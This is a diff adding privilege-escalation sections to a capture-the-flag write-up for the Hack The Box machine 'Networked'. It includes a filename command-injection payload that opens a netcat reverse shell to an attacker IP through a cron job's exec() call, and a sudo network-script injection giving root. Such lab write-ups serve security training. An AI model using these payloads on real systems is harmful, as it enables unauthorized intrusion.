@@ -150,7 +150,69 @@ foreach ($files as $key => $value) {
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2c2845e5-7723-4b08-856d-546d84da1eb7)
 
++ The script takes in all the files in the **/var/www/html/uploads** directory and running the **getnameCheck()** and **check_ip()** functions on it from the **lib.php** file.
++ The **getnameCheck()** function simply separates the name of the file from the extension of the file. The **check_ip()** function checks if the filename is a valid IP address. If it is not, it will return false which will trigger the attack component in the **check_attack.php** file.
++ This passes the path of the file to the **exec()** function and deletes it. Of course, no validation is being done on the input of the **exec()** function and so we can abuse it to escalate privileges.
++ Change to the **/var/www/html/uploads** directory and create the following file: `touch '; nc -c bash 10.10.14.21 5555'`
++ The **;** will end the **rm** command in the **exec()** function and run the **nc** command, which will send a reverse shell back to our machine.
++ Start netcat listener on the attack machine: `nc -lnvp 5555`
++ Wait three minutes for the cron job to run, and get **guly**'s shell.
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4bafa09d-30ee-4f61-9cb6-dc8f1d57199c)
+
++ Again [shell upgrade](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/25_Networked.md#shell-upgrade), and get user flag.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/938570b0-91f5-47d9-9810-b9ea29eab205)
+
+
+## Privilege Escalation: from 'guly' to 'root'
++ Escalate privileges to get the root flag.
++ View commands the user can run using sudo without a password: `sudo -l`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c45e3e63-f884-4c89-afcd-52dbbd05b46b)
+
++ View the script of **/usr/local/sbin/changename.sh**
+```bash
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+	echo "interface $var:"
+	read x
+	while [[ ! $x =~ $regexp ]]; do
+		echo "wrong input, try again"
+		echo "interface $var:"
+		read x
+	done
+	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+```
+
++ View content of **/etc/sysconfig/network-scripts/ifcfg-guly**.
+```
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+NAME=a id
+PROXY_METHOD=a ls /root
+BROWSER_ONLY=a pwd
+BOOTPROTO=a whoami
+```
+
++ Run the command: `sudo /usr/local/sbin/changename.sh`
++ It asks the user for these options: NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO
++ Type for BOOTPROTO: `try bash`
++ Get the root shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6a916b23-60f3-418b-bf65-88df19b141ff)
 
 
 # Technical Knowledge
@@ -163,6 +225,7 @@ foreach ($files as $key => $value) {
 
 # References & Alternatives
 + https://vvmlist.github.io/#Networked
++ https://infosecwriteups.com/hackthebox-networked-writeup-3d0a1276ad3c
 + https://0xdf.gitlab.io/2019/11/16/htb-networked.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/networked-writeup-w-o-metasploit
 + xxx
